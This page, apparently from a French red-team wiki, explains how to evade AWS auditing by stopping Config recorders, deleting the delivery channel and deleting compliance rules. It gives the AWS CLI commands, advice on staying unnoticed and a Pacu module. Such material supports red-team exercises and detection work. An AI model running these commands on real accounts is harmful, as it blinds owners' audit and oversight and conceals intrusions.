---
title: "Config : arrêter les recorders et supprimer les règles"
order: 3
description: "Arrêter les recorders AWS Config et supprimer les règles pour masquer les changements de configuration à l'audit."
keywords:
  - AWS Config
  - recorder
  - rules
  - configuration
  - tampering
---

# Config

AWS Config enregistre l'état de configuration de chaque ressource dans le temps et l'évalue par rapport à des règles : il capture donc les changements de ressources qu'une opération laisse derrière elle. Arrêter le recorder ou retirer son delivery channel interrompt cet historique ; supprimer les règles retire les contrôles de conformité qui signaleraient un changement.

## Arrêter le recorder et la livraison

```bash
aws configservice describe-configuration-recorders
aws configservice stop-configuration-recorder --configuration-recorder-name default
aws configservice delete-delivery-channel --delivery-channel-name default
aws configservice delete-configuration-recorder --configuration-recorder-name default
```

## Supprimer les règles qui vous signaleraient

```bash
aws configservice describe-config-rules
aws configservice delete-config-rule --config-rule-name <rule>
```

## Notes d'exploitation

- Arrêter le recorder est une action enregistrée dans CloudTrail ; séquencez-la avec le travail sur [CloudTrail](cloudtrail.md) lorsque le silence compte.
- Config est régional et peut agréger à travers les comptes ; un agrégateur d'organisation dans un autre compte continue de collecter même après l'arrêt d'un recorder local.
- Retirer le delivery channel casse discrètement l'expédition de l'historique sans l'état évident « recorder arrêté ».

## Outils

- **AWS CLI** (`configservice`) : contrôle du recorder, du delivery-channel et des règles.
- **Pacu** (`detection__disruption`) : désactive Config aux côtés de CloudTrail et GuardDuty.

## Références

- [HackTricks Cloud : contournement de défense AWS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/index.html)
- [AWS : stop-configuration-recorder](https://docs.aws.amazon.com/config/latest/APIReference/API_StopConfigurationRecorder.html)
- [Stratus Red Team : techniques de contournement de défense AWS](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Datadog Security Labs : recherche sur le contournement de défense AWS](https://securitylabs.datadoghq.com/)
